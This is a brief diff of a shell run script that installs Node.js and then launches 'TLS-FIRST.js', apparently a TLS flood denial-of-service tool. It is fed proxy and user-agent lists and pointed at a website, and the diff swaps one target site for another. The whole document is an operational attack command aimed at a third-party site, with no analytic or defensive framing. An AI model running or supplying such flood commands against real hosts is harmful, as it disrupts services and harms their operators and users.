@@ -6,5 +6,5 @@ bash install.sh -y
 apk add nodejs
 apk add npm
 npm i colors
-node TLS-FIRST.js https://kickrussiaout.info/ 3000 proxy.txt ua.txt 15 100
+node TLS-FIRST.js https://nerabota.net/main 3000 proxy.txt ua.txt 15 100
 
